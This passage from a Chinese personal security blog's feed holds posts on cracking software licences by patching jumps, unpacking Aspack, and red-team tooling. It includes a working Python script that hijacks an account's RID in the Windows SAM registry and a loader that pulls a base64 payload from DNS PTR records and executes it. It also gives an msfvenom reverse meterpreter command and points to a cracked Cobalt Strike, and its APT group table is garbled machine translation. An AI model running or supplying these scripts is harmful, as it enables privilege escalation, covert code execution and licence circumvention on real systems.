      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>时间过的真是快，转眼就已经到了期中考了。还好我这个星期参加了比赛，不用考试。老师给的分比我自己考的还要高[滑稽]<br><img src="https://s1.ax1x.com/2018/11/02/ihxPVf.jpg" alt="ihxPVf.jpg"></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>恒大的课程第16课，去除qq桌球瞄准器的附加安装，学习到了不少。在此做个总结<br>首先拿到PE还是先查壳，PEID一查无壳<br><img src="attachments\c0abd1ee.png" alt="c0abd1ee.png"><br>拖入OD，运行F8，发现程序飞了..<br><img src="https://s1.ax1x.com/2018/11/02/ihxDiD.png" alt="ihxDiD.png"><br>对其下断点，程序运行程序。F7进入call ,然后继续F8，找到下一个会跳出框框的call<br><img src="https://s1.ax1x.com/2018/11/02/ihxho8.png" alt="ihxho8.png"><br>在寻找下一个call 的时候，我们的程序运行到了一个loop，解决方法是通过F4运行到指定位置<br><img src="https://s1.ax1x.com/2018/11/02/ihxOe0.png" alt="ihxOe0.png"></p><p><img src="https://s1.ax1x.com/2018/11/02/ihxzYF.md.png" alt="ihxzYF.md.png"><br>然后继续F8，发现到下一个冒出这个框框的地址，方法如上<br><img src="https://s1.ax1x.com/2018/11/02/ihzPyR.png" alt="ihzPyR.png"><br>然后继续F8，发现下一个出现框框的地址，方法还是一样，直到发一个jnz判断是否跳过的call的<br>将那个jnz改为jmp就能跳过了<br><img src="https://s1.ax1x.com/2018/11/02/ihz30P.md.png" alt="ihz30P.md.png"><br>寻找关键跳判断call，这里我发现一个小技巧，会有一点不同，他是运行一秒之后又变成了暂停，这代表就是最好一个地址，直接Noop掉也可以</p><p>其实去除指定位置的框框最好的方法就是F12暂停法，暂停下来，显示地址调用在进call跟踪，或者直接把cll给nop掉完事</p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>python实现rid劫持</title>
      <link href="/posts/b921a9fe.html"/>
      <url>/posts/b921a9fe.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上个星期的时候在弄rid劫持的实验，当时想用python写个rid劫持的操作。后面时间不够上学了<br>这个星期回来整了出来。星期五被win32API弄的心态崩了= =后面换了种思路<br><img src="https://s1.ax1x.com/2018/10/27/i65Mb8.jpg" alt="i65Mb8.jpg"></p><p>#正文#<br>先说一下一开始的思路</p><pre><code>一开始我是想着用win32API和win32con读取注册表的键值进行修改的但是REG_BINARY类型的值死活你用bytes类型的格式进行修改，后面我查了读取出来键值的值的编码类型，解码出来简直是神鬼难救啊，这改个鬼鬼哦</code></pre><p>解出来的是这种东西，你不解就修改不了，因为他是bytes类型<br><img src="https://s1.ax1x.com/2018/10/27/i6535Q.png" alt="i6535Q.png"></p><p>后面今天早上的思路就是</p><pre><code>用reg命令导出成reg文件，然后修改指定位置的值在用regdeit  /s  xx.reg,在用win32API读取修改位置的值进行对比，如果匹配就劫持成功`</code></pre><p>代码如下：</p><pre><code>import osimport win32apiimport win32conimport timen=0def rid_hack(path):    try:        ps_numer=&#39;REG EXPORT HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000003F1  {}AppBkUp.reg&#39;.format(path)         zx=os.system(ps_numer) //导出HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000003F1的键值        n=1        print(&#39;[+] 命令执行成功&#39;)    except:        pass    time.sleep(1)    if os.path.exists(&#39;{}AppBkUp.reg&#39;.format(path)): //判断导出的reg 文件是否存在        print(&#39;[+] ok reg is ok&#39;)    else:        print(&#39;[-] reg in not found&#39;)        exit()    dk=open(&#39;{}AppBkUp.reg&#39;.format(path),&#39;r&#39;,encoding=&#39;utf-16&#39;)    xj=open(&#39;{}Rid_Hack.reg&#39;.format(path),&#39;w&#39;,encoding=&#39;utf-16&#39;)    for line in dk:        if &#39;f1&#39; in line:            line=line.replace(&#39;f1&#39;,&#39;f4&#39;).replace(&#39;03&#39;,&#39;01&#39;) //修改键值        xj.write(line)    dk.close()    xj.close()    zxw=os.system(&#39;regedit /s {}Rid_Hack.reg&#39;.format(path)) //导入注册表    key = win32api.RegOpenKey(win32con.HKEY_LOCAL_MACHINE, &#39;SAM\\SAM\\Domains\\Account\\Users\\000003F1&#39;, 0,win32con.KEY_ALL_ACCESS)    a = win32api.RegQueryValueEx(key, &#39;F&#39;)  //读取F的键值    if &#39;xf4&#39; and &#39;x01&#39; in str(a[0]): //判断是否存在        print(&#39;[+] rid劫持成功&#39;)    else:        print(&#39;[-] rid劫持失败&#39;)if __name__ == &#39;__main__&#39;:[VID_20181027_103535.mp4](attachments\6a167db9.mp4)    user=input(&quot;路径：&quot;)    rid_hack(user)</code></pre><p>测试结果：</p><p><iframe width="560" height="315" src="https://www.youtube.com/embed/2GnRs-v28Uk" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe><br>转载请声明转自：422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>about</title>
      <link href="/posts/b5f422e3.html"/>
      <url>/posts/b5f422e3.html</url>
      <content type="html"><![CDATA[<h1 id="自我介绍"><a href="#自我介绍" class="headerlink" title="自我介绍"></a>自我介绍</h1><p><img src="https://s1.ax1x.com/2018/10/20/iBVjAJ.jpg" alt="iBVjAJ.jpg"><br>名称:九世<br>博客:422926799.github.io &amp;&amp; <a href="https://www.cnblogs.com/haq5201314" target="_blank" rel="noopener">东京$ - 博客园</a><br>爱好:渗透测试，破解，各种语言<br>梦想:成为像车王一样的大佬<br>经历:还在读书…</p>]]></content>
      
      
        <tags>
            
            <tag> About </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>使用DarkDe通过按钮事件寻找关键代码部分</title>
      <link href="/posts/85f395de.html"/>
      <url>/posts/85f395de.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一般的PE关键字搜索不到关键字，等其他办法试完之后，找不到关键代码部分。肯定是非常痛苦的，但是我们可以通过DarKDe来定位布局事件来寻找关键代码。<br><img src="https://s1.ax1x.com/2018/10/20/iBVCwQ.jpg" alt=""></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><pre><code>此文接着上次的Telnet连接器进行破解，上次我直接搜关键字进行破解的。这次通过定位按钮的段地址寻找关键代码。</code></pre><p>使用DarkDe注意事项：软件必须是没有壳的，有壳是加载不出使用的函数<br>这里我的壳已经脱掉了，用PEID可以明显的看到是BC++写的<br><img src="https://s1.ax1x.com/2018/10/20/iBVPoj.png" alt="iBVPoj.png"><br>载入DarkDe<br><img src="https://s1.ax1x.com/2018/10/20/iBVVS0.png" alt="iBVVS0.png"><br>点击进程寻找对应按钮的数量<br><img src="https://s1.ax1x.com/2018/10/20/iBVZlV.md.png" alt="iBVZlV.md.png"><br>打开按钮事件，复制第一个段地址，在OD里进行条件搜索，并对其下断点<br><img src="https://s1.ax1x.com/2018/10/20/iBV3f1.md.png" alt="iBV3f1.md.png"><br>对剩下的两个按钮事件步骤一样下断点<br>因为我们这里要破解注册，所以我们把注意力放在注册的按钮上<br><img src="https://s1.ax1x.com/2018/10/20/iBVa0e.md.png" alt="iBVa0e.md.png"><br>既然这个断点是注册按钮的，那么下面的指令肯定是处理注册的，把注意力放下面<br>发现注册成功的语句，寻找跳转语句<br><img src="https://s1.ax1x.com/2018/10/20/iBV0kd.png" alt="iBV0kd.png"><br>对第一个je下断，发现是关键跳，尝试将其nop掉看看是否成功，重启软件发现注册成功<br><img src="https://s1.ax1x.com/2018/10/20/iBVHXT.png" alt="iBVHXT.png"><br>转载请注明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>获取指定Mac地址上线</title>
      <link href="/posts/15535e9f.html"/>
      <url>/posts/15535e9f.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之所以有了这篇文章，是因为实验室里有了摄像头。害怕打鬼泣的时候被发现，所以就写了这个脚本<br><img src="https://s1.ax1x.com/2018/10/20/i0uk11.jpg" alt="i0uk11.jpg"></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>思路：</p><pre><code>利用scapy模块获取局域网内的存活的Mac和IP地址当匹配到指定的Mac地址存在的话，那么摄像头可能就启动了发封邮件给自己邮箱</code></pre><p>代码：</p><pre><code>from scapy.all import *from threading import Threadimport reimport smtplibfrom email.mime.text import MIMETextfrom email.header import Headerxj=open(&#39;logo.txt&#39;,&#39;w&#39;)xj.close()user=input(&#39;Please IP,&gt;&quot;192.168.1/24&quot; --&gt;&#39;)user2=input(&#39;Please dst Mac --&gt;&#39;)macs=[]txs=[]def logo(lg):    print(lg,file=open(&#39;logo.txt&#39;,&#39;a&#39;))def scan(host,dstmac):    global dstmacs,dstips    while True:        try:            ang,uag=srp(Ether(dst=&#39;FF:FF:FF:FF:FF:FF&#39;)/ARP(pdst=host),timeout=2) //发送一个包            for send,rcv in ang:                listMac=rcv.sprintf(&#39;Mac:%Ether.src%--IP:%ARP.psrc%&#39;) //获取存活Mac对应的IP地址                macs.append(listMac)                logo(&#39;Obtain Mac {}&#39;.format(listMac))        except Exception as a:            print(&#39;[-] Error {}&#39;.format(a))        for u in macs:            zz = re.findall(&#39;Mac:[0-9-a-z-A-Z][0-9-a-z-A-Z]:[0-9-a-z-A-Z][0-9-a-z-A-Z]:[0-9-a-z-A-Z][0-9-a-z-A-Z]:[0-9-a-z-A-Z][0-9-a-z-A-Z]:[0-9-a-z-A-Z][0-9-a-z-A-Z]:[0-9-a-z-A-Z][0-9-a-z-A-Z]|IP:*.*.*&#39;,str(u))            cl=str(zz).replace(&#39;[&#39;,&#39;&#39;).replace(&#39;]&#39;,&#39;&#39;).replace(&#39;Mac:&#39;,&#39;&#39;).replace(&quot;&#39;&quot;,&#39;&#39;) //正则过滤            if dstmac in cl:                tx = 0                txs.append(tx)                print(&#39;[+] Match to the corresponding Mac address:{}&#39;.format(dstmac))                dstmacs=dstmac                zz2=re.findall(&#39;IP:*.*.*&#39;,str(cl))                for dstip in zz2:                    dp=str(dstip).replace(&#39;IP:&#39;,&#39;&#39;).strip()                    print(&#39;[+] The corresponding IP address is:{}&#39;.format(dp))                    logo(&#39;[+] The corresponding IP address is:{}&#39;.format(dp))                    dstips=dp            else:                logo(&#39;[-] No match to the corresponding Mac address.&#39;)        for v in txs:            print(v)            if int(v)==0:                print(dstmacs,dstips)                emails(dstmacs,dstips)                break            else:                continuedef emails(dstmacs,dstips): //发送邮箱    try:        username=&#39;**********&#39;        password=&#39;*******&#39;        messeng=MIMEText(&#39;警告：指定的Mac地址上线，老师可能来了。快不要玩游戏,Mac:{},IP:{}&#39;.format(dstmacs,dstips),&#39;plain&#39;,&#39;utf-8&#39;)        messeng[&#39;From&#39;]=Header(&#39;警告信息&#39;,&#39;utf-8&#39;)        messeng[&#39;TO&#39;]=Header(&#39;422926799@qq.com&#39;,&#39;utf-8&#39;)        messeng[&#39;Subject&#39;]=Header(&#39;警告&#39;,&#39;utf-8&#39;)        smtp=smtplib.SMTP()        smtp.connect(&#39;smtp.sohu.com&#39;,&#39;25&#39;)        smtp.login(username,password)        smtp.sendmail(&#39;chinaanonymous@sohu.com&#39;,[&#39;422926799@qq.com&#39;],messeng.as_string())        smtp.quit()        print(&#39;[+] send email ok&#39;)        exit()    except Exception as r:        print(r)        exit()if __name__ == &#39;__main__&#39;:    t=Thread(target=scan,args=(user.strip(),user2.strip()))    t.start()</code></pre><p>测试结果：<br><img src="https://s1.ax1x.com/2018/10/20/i0uA6x.md.png" alt=""></p><p>转载请注明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PYTHON通过DNS协议传输后门</title>
      <link href="/posts/2726caf0.html"/>
      <url>/posts/2726caf0.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>首先吐槽一下，，做了一天护网杯的题发现一题也做不了。我擦。。。心情mmp，然后这个实验是在上学的时候在FB看到的。这里的我也实验了一遍就当做个记录<br><img src="https://s1.ax1x.com/2018/10/13/iNoicj.jpg" alt=""></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>先放出FB看的那篇文章吧</p><pre><code>转自Freebuf</code></pre><p>DNS后门与检测：<code>http://www.freebuf.com/articles/network/185324.html</code></p><p><strong>思路</strong></p><pre><code>这篇文章的主要思路是通过DNS的PTR记录存放payload然后，用python获取数据进行拼接payload。</code></pre><p>实现过程：</p><pre><code>需要环境：Windows server 2008 和 Kali1.首先用windows server 2008搭建好DNS服务</code></pre><p><img src="https://s1.ax1x.com/2018/10/13/iNoobq.png" alt=""></p><pre><code>2.创建数个PTR记录，放入payload,我这里将其进unicode编码</code></pre><p><img src="https://s1.ax1x.com/2018/10/13/iNob5T.md.png" alt=""></p><pre><code>3.写代获取payload并进行拼接，然后执行import osimport redef zx():    xj=open(&#39;zc.txt&#39;,&#39;w&#39;)    xj.close()    gl=[]    payload=[]    for r in range(101,176):        qq=os.popen(&#39;nslookup -qtr=ptr 192.168.89.{}&#39;.format(r)) #使用nslookup获得这段IP的ptr记录        zz=re.findall(&#39;name = .*&#39;,qq.read()) #正则进行过滤        for k in zz:            sc=str(k).replace(&quot;name = &quot;,&#39;&#39;)            gl.append(sc)    for z in gl:        dw=re.findall(&#39;[u][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z]&#39;,str(z))        for w in dw:            dwe=&#39;\\&#39;+w #在DNS中是没有斜杆的得自己手动加上            print(dwe,end=&#39;&#39;,file=open(&#39;zc.txt&#39;,&#39;a&#39;))    dk=open(&#39;zc.txt&#39;,&#39;r&#39;)    reads=dk.read()    exploit=reads.encode(&#39;utf-8&#39;).decode #编码成字符串 (&#39;unicode_escape&#39;)    mls=&quot;&quot;&quot;python -c &quot;exec(&#39;{}&#39;.decode(&#39;base64&#39;)){}&quot;&quot;&quot;.format(exploit,&#39;&quot;&#39;)    os.system(mls) #执行zx()</code></pre><p>测试结果如下：</p><p><img src="https://s1.ax1x.com/2018/10/13/iNT2e1.png" alt=""></p><p><img src="https://s1.ax1x.com/2018/10/13/iNTRdx.png" alt=""></p><p>音乐：<embed src="//music.163.com/style/swf/widget.swf?sid=531925&type=2&auto=1&width=320&height=66" width="340" height="86" allownetworking="all"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CreateSpace.Hacker3读书笔记（一）</title>
      <link href="/posts/7b745eec.html"/>
      <url>/posts/7b745eec.html</url>
      <content type="html"><![CDATA[<p>更新时间：2018.10.6 18:09<br>CreateSpace-Hacker3介绍<br>放假的时候会准时更新</p><p><img src="https://s1.ax1x.com/2018/10/06/iGC8E9.jpg" alt=""><br>用于介绍红队攻击的操作，我也是刚刚看哈。说错的麻烦指出了</p><p><b>渗透测试团队与红队</b></p><blockquote><p>这是红队开始发挥作用的地方。红队的任务是模仿对手的战术，技术和程序（TTP）。目标是提供关于公司如何应对的真实世界和事实，在安全计划中找到差距，确定员工内部的技能差距，并最终提高他们的安全态势。</p></blockquote><p>自己的理解：说白了红队介绍模仿hack攻击的手法，在合法的范围内。并且没有公告测试蓝色团队，从而确定员工内部人员的技能差距。最终达到的目的是提高员工的安全姿势。</p><p><img src="https://s1.ax1x.com/2018/10/06/iGCajO.png" alt=""></p><p><b>APT组和操作文档的运行列表</b></p><blockquote><p>此Google文档（<a href="http://bit.ly/2GZb8eW）会分解不同的可疑APT组及其工具集。这是一个有用的列表，我们作为红色Teamers来模拟不同的攻击。当然，我们可能不会使用报告中记录的相同工具，但我们可能会构建类似的工具来执行相同的操作。" target="_blank" rel="noopener">http://bit.ly/2GZb8eW）会分解不同的可疑APT组及其工具集。这是一个有用的列表，我们作为红色Teamers来模拟不同的攻击。当然，我们可能不会使用报告中记录的相同工具，但我们可能会构建类似的工具来执行相同的操作。</a></p></blockquote><p><a href="https://docs.google.com/spreadsheets/d/1H9_xaxQHpWaa4O_Son4Gx0YOIzlcBWMsdvePFX68EKU/edit#gid=361554658" target="_blank" rel="noopener">APT Groups and Operations文档</a></p><pre><code>中国                通用名称   CrowdStrike IRL   卡巴斯基   SecureWorks公司  美国麦迪安网络安全公司  FireEye  赛门铁克  iSight摄像头  思科（Sourcefire / VRT&gt; Talos） Palo Alto Unit 42  其他名称 操作1  操作2  操作3  操作4  工具箱/恶意软件 评论组  评论熊猫  中国人民解放军第61398部队  TG-8223  APT 1  棕狐  第3组  GIF89A，ShadyRAT，上海集团，拜占庭坦桑尼亚  阴暗鼠  WebC2、饼干等APT 2 Putter Panda PLA单元61486 TG-6952 APT 2 Group 36 SearchFire MSUpdater这个威胁行为者以美国技术（通信、航天、航空）、研究、国防和政府部门的公司为目标，进行间谍活动。它使用的工具和基础设施与人民解放军61398部队重叠。UPS哥特熊猫TG-0110 APT 3 Buckeye UPS团队6Boyusec-广州Boyu信息技术有限公司秘密狐狸双击秘密狼射击，Pirpi，PlugX/Sogu，Kaba，Cookie Cutter，许多0天：IE，Firefox，Flash，SportLoader。在国防、建筑、技术和运输部门中妥协实体。直到2015，它主要集中在美国和英国实体，但后来转移到香港的“基于目标”。航空航天与国防；建筑与工程；能源；高科技；非营利；电信；交通；https://www.fire..com/blog/.-./2015/06/.-.-wolf-adobe-flash-zero-day.html http://www.secureworks.com/resources/blog/./.-group-0110-tar通过网络钓鱼获取制造业和金融组织IXESHE编号熊猫TG-2754(暂定)APT 12 BeeBus Calc小组22 DynCalc，深红铁，DNSCalc NYT 2012年10月-Etumbot，Riptide，Hightide，ThreeByte，Waterspout，Mswab，Gh0st，ShowNews，3001。这种威胁行为者针对的是日本、台湾和东亚其他地区的组织包括电子制造商和电信公司，用于间谍目的。http://www.crowdstrike.com/blog/whois-number-panda/http://www.computerworld.com/s/./9241577/The_China_hacker_group_the_._the_N.Y.Times_is_back_with_update_tools？分类分类号＝17APT 16 APT 16 ELMER后门：这种威胁行为者以日本和台湾的金融、技术、媒体和政府部门的实体为目标，危害这些实体。E本地Windows特权升级漏洞CVE-2015-1701。成功利用两个漏洞导致下载器（IRONHALO）或后门（ELMER）的交付。https://www.fire..com/blog/.-./2015/12/the_eps_awakens.html https://www.fire..com/blog/.-./2015/12/the-eps-awakens-part-2.html。隐藏Lynx Aurora Panda APT 17副犬隐藏Lynx Tailgater Team 8组公理，体育迷，温蒂伞（Winnti Umbrella）短暂水螅黑咖啡，WEBCnC，快乐大鼠，插头，木马。Naid，后门。Moudoor，后门。流浪者，后门。博达，木马。水龙头，ZxShell，Sakula，中国直升机政府，击败nse &amp;航空航天，工业工程，非政府组织http://www.fire..com/blog/./cyber-.its/2013/09/.-vice-dog-zero-day-cve-2013-3893-.-to-japanese-target.http://www.fire..com/blog/./cyber-.its/2013/11/.-ephem.-.-ie-zero-daylink-to-DePutydo-UsS-无盘方法周比炸毁熊猫PLA海军TG-0416 APT 18 HTTP浏览器、令牌控制、HcdLoader、PisLoader航空和国防；建筑与工程；教育；卫生与生物技术；高科技；电信；运输间谍在社区卫生破坏/107828 http://www..eshare.net/CrowdStrike/.-casts-.-you-.-an-.ersary-problem公理APT 17尾门小组72条狗鱼（i.se），副犬（i.se），温蒂伞SMN Winnti，Gh0st RAT，毒藤，HydraQ，Hikit，ZxShell，副犬，Derusbi，PlugX，HTRAN，HDRoot，F.，Timestomper Shell船员，在DCs http://securelist.com/blog/researc上使用“骨骼钥匙”。H／57585／WNNTI—FAQ—My-SE-THOST/HTTP://www. NOVETA.COM/FILES/5614/139/622/NoVeTaTyCytoSurvivyExcel摘要-PDF温蒂集团：邪恶熊猫，温蒂伞，AceHash，PlugX，Webshells，ZxShell深层熊猫，邪恶蜘蛛http://blog.trendmicro.com/trendlabs-security-./winnti-.ses-github/https://www.protectwise.com/blog/winnti-.-.-open-source.html壳牌船员深熊猫网络大师APT 19功夫小猫组13 Sh3llCr3w，粉红豹歌曲，OPM歌曲《黑客樱桃/萨库雷尔》，德鲁比，扫描框框架，包括中国斩波器，WCE公理http://cyber.s.net/wp-content/uploads/2013/06/Deep-Panda.pdf https://www.isight合作伙伴/COM/2015/07/TraveSCAPE-METIAL HOPENTHEEL -更新周JULY-29 TH/Naikon Lotus Panda PLA单元78020 Naikon APT 30萤火虫MsnMM Naikon照相机Shy RARSTONE，BACKSPACe，NETEAGLE，XSControl https://securelist.com/./publications/69953/the-naikon-apt/http://blog..。</code></pre><p><b>设置你的目标</b></p><blockquote><p>在您破坏第一个系统之前，您需要确定红色团队活动的范围。在许多渗透测试中，您将获得一个目标，并且您不断尝试进入该单一系统。如果出现问题，你会继续下一件事。没有脚本，您通常非常专注于该网络。</p></blockquote><pre><code>1.最终目标是什么？它只是APT检测？它是在服务器上获得一个标志？是从数据库中获取数据吗？或者只是获得TTD指标？2.是否有我们要的目标？3.你打算用什么技术？我们谈到了使用MITRE ATT和CK Matrix，但每个类别的确切技术是什么？4.Red Canary的团队提供了有关这些技术的详细信息。我强烈建议你花点时间仔细检查它们：http：//bit.ly/2H0MTZA客户希望您使用哪些工具？它会是像Metasploit，Cobalt Strike，DNS Cat这样的COTS攻击性工具吗？还是定制工具？</code></pre><p><b>搭建外网攻击环境</b></p><blockquote><p>在红队攻击前，你得安装好你的神兵利器来帮助你完成一次完美的攻击。而安装工具总是麻烦的。<a href=">https://github.com/trustedsec/ptf">PTF</a>可以帮助你快速的安装工具</p></blockquote><blockquote><p>项目地址：<a href="https://github.com/trustedsec/ptf" target="_blank" rel="noopener">https://github.com/trustedsec/ptf</a></p></blockquote><pre><code>sudo apt-get install gitgit clone https://github.com/trustedsec/ptf.gitcd ptf./ptfuse modules/exploitation/install_update_all use modules/intelligence-gathering/install_update_alluse modules/post-exploitation/install_update_alluse modules/powershell/install_update_alluse modules/vulnerability-analysis/install_update_all当然你也可以按照项目的那条命令一次性更新全部，这里我不推荐直接更新全部。因为你的VPS可能会爆掉</code></pre><p><img src="https://s1.ax1x.com/2018/10/06/iGPnIA.png" alt=""><br>安装完成后进入Pentes可以看见安装的工具，这里我只安装了部分的工具<br><img src="https://s1.ax1x.com/2018/10/06/iGPQRP.png" alt=""><br><b>下面是一些工具介绍</b><br>(这里我就直接从书上复制过来了)</p><pre><code>1.Metasploit框架 Metasploit Framework仍然是一个黄金标准工具，尽管它最初是在2003年开发的。这是由于原始创建者HD Moore以及支持它的非常活跃的社区。这个社区驱动的框架（https://github.com/rapid7/metasploit-framework/commits/master）似乎每天更新，包含所有最新的公共漏洞，后期开发模块，辅助模块等。2.混淆Meterpreter有效负载如果我们正在执行某些社交工程攻击，我们可能希望使用Word或Excel文档作为我们的交付机制。但是，一个潜在的问题是，我们可能无法包含Meterpreter有效负载二进制文件或让它从Web下载一个，因为AV可能会触发它。此外，一个简单的解决方案是使用PowerShell进行模糊处理：msfvenom --payload windows / x64 / meterpreter_reverse_http --format psh --outmeterpreter-64.ps1 LHOST = 127.0.0.1我们甚至可以将其提升到新的水平，并使用Unicorn（https://github.com/trustedsec/unicorn）等工具生成更多模糊的PowerShell Meterpreter有效负载，我们将在本书中详细介绍这些负载。3.Cobalt Strike 什么是钴罢工？它是后期开发，横向移动，隐藏在网络中和渗透的工具。Cobalt Strike并没有真正的漏洞利用，也没有用于通过最新的0天漏洞来破坏系统。如果您已经在服务器上执行代码或将其用作网络钓鱼活动负载的一部分，那么您真正看到其广泛的功能和强大功能。一旦您可以执行Cobalt Strike有效负载，它就会创建一个Beacon连接，返回命令和控制服务器。（网上有3.8破解版自行下载）4.Cobalt Strike Aggressor ScriptsCobalt Strike有许多人为Cobalt Strike项目做出贡献。Aggressor Script是一种脚本语言，适用于受可编写脚本的IRC客户端和机器人启发的Red Team操作和对手模拟。它的目的有两个：（1）您可以创建长时间运行的机器人模拟虚拟红队成员，与您并肩黑客攻击，（2）您也可以使用它来扩展和修改Cobalt Strike客户端到您的需要[https://www.cobaltstrike.com/aggressor-script/index.html]。例如，HarleyQu1nn汇集了一系列不同的攻击者脚本，用于您的后期利用：http：//bit.ly/2qxIwPE。5.PowerShell帝国Empire是一个后开发框架，包括纯PowerShell2.0 Windows代理和纯Python 2.6 / 2.7 Linux / OS X代理。它是以前的PowerShell Empire和Python EmPyre项目的合并。该框架提供了密码安全通信和灵活的架构。在PowerShell方面，Empire实现了运行PowerShell代理的能力，无需PowerShell.exe，可快速部署的后期开发模块，从关键记录器到Mimikatz，以及适应性通信以逃避网络检测，所有这些都包含在以可用性为中心的框架中[ https://github.com/EmpireProject/Empire。5.dnscat2此工具旨在通过DNS协议创建加密的命令和控制（C2）通道，这是几乎每个网络的有效隧道[https://github.com/iagox86/dnscat2]。通过DNS进行C2和渗透提供了一种很好的机制来隐藏您的流量，规避网络传感器并绕过网络限制。在许多限制性或生产环境中，我们遇到的网络要么不允许出站流量，要么受到严格限制/监控的流量。为了解决这些问题，我们可以使用像dnscat2这样的工具。我们关注dnscat2的原因是因为它不需要root权限并允许shell访问和exfiltration。在许多安全环境中，直接出站UDP或TCP受到限制。为什么不利用基础架构中已经内置的服务？许多受保护的网络包含用于解析内部主机的DNS服务器，同时还允许解析外部资源。通过为我们拥有的恶意域设置权威服务器，我们可以利用这些DNS解析来执行我们的恶意软件的命令和控制。6.p0wnedShell正如p0wnedShell的Github页面所述，这个工具是“用C＃编写的令人反感的PowerShell主机应用程序，它不依赖于powershell.exe，而是在powershell运行空间环境（.NET）中运行powershell命令和函数。它包含许多令人反感的PowerShell模块和二进制文件，使后期利用过程更加容易。我们尝试的是建立一个“一体化”的后开发工具，我们可以使用它来绕过所有缓解解决方案（或至少一些关闭），并且包含所有相关工具。您可以使用它在Active Directory环境中执行现代攻击，并在您的Blue团队中创建意识，以便他们可以构建正确的防御策略。“[https://github.com/Cn33liz/p0wnedShell]7.Pupy ShellPupy是“一个开源，跨平台（Windows，Linux，OSX，Android）远程管理和后期开发工具，主要用python编写。”[https://github.com/n1nj4sec/pupy]8.PoshC2PoshC2是“一个代理感知的C2框架，完全用PowerShell编写，以帮助渗透测试人员进行红色团队合作，后期开发和横向移动。这些工具和模块是在我们成功的PowerShell会话和Metasploit框架的有效负载类型的基础上开发的。PowerShell被选为基本语言，因为它提供了所需的所有功能和丰富的功能，而无需向框架引入多种语言。“[https://github.com/nettitude/PoshC2]9.梅林Merlin（https://github.com/Ne0nd0g/merlin）利用最近开发的名为HTTP / 2（RFC7540）的协议。Per Medium，“HTTP / 2通信是多路复用的，双向连接不会在一个请求和响应之后结束。此外，HTTP / 2是一个二进制协议，使其更紧凑，易于解析，并且不具备人类可读性使用口译工具。“[https://medium.com/@Ne0nd0g/introducing-merlin-645da3c635a#df21]Merlin是一个用GO编写的工具，外观和感觉类似于PowerShell Empire，并且允许使用轻量级代理。它不支持任何类型的后期开发模块，因此您必须自己完成。10.霓裳Nishang（https://github.com/samratashok/nishang）是一个脚本和有效负载的框架和集合，可以使用PowerShell进行攻击性安全，渗透测试和Red Teaming。Nishang在渗透测试的所有阶段都很有用。</code></pre><p>转载请声明转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>BC++语言的PE脱壳</title>
      <link href="/posts/e1579f87.html"/>
      <url>/posts/e1579f87.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>昨天晚上学习shark恒的教程的第一期第十四课，教的是脱BC++语言PE的壳子，也学到了脱壳要谨记的三件事。<br><img src="https://s1.ax1x.com/2018/10/06/iG9MTA.png" alt=""></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>这节课拿到的是一个Telnet连接器<br><img src="https://s1.ax1x.com/2018/10/06/iG9lFI.md.png" alt=""><br>还是先查壳<br><img src="https://s1.ax1x.com/2018/10/06/iG9tOg.md.png" alt=""></p><pre><code>Aspack v2.12 -&gt; Alexey Solodovnikov ( Sn-flag:ok )</code></pre><p>Aspack壳，将程序拖入OD（满足ESP定律脱壳操作）<br><img src="https://s1.ax1x.com/2018/10/06/iG9GSf.md.png" alt=""><br>(注：这里我不用恒大那么麻烦，直接OD脱掉就行了，OD会帮你自动寻找IAT，而且恒大那个办法我实验的时候转存出来的EXE有报错)<br>脱壳操作：<br>到达OEP<br><img src="https://s1.ax1x.com/2018/10/06/iG9spV.md.png" alt=""><br>从模块中删除分析<br><img src="https://s1.ax1x.com/2018/10/06/iG9cXF.png" alt=""><br>OD调试脱壳进程，保存EXE，软件也是打的开的<br><img src="https://s1.ax1x.com/2018/10/06/iG9W79.png" alt=""></p><p><img src="https://s1.ax1x.com/2018/10/06/iG9hkR.png" alt=""><br>这个软件破解就不说了，搜索关键字找到跳转nop填充。。。<br>下面给出一些常见的OEP和区段信息</p><p>BC++的OEP<br><img src="https://s1.ax1x.com/2018/10/06/iG976O.png" alt=""></p><p>Delphi7的OEP<br><img src="https://s1.ax1x.com/2018/10/06/iG9qne.png" alt=""><br>V2008Release的区段信息<br><img src="https://s1.ax1x.com/2018/10/06/iG9O7d.png" alt=""><br>VB5的OEP<br><img src="https://s1.ax1x.com/2018/10/06/iG9vtI.png" alt=""><br>VB6的OEP<br><img src="https://s1.ax1x.com/2018/10/06/iGCS9P.png" alt=""><br>VC6和易语言的OEP<br><img 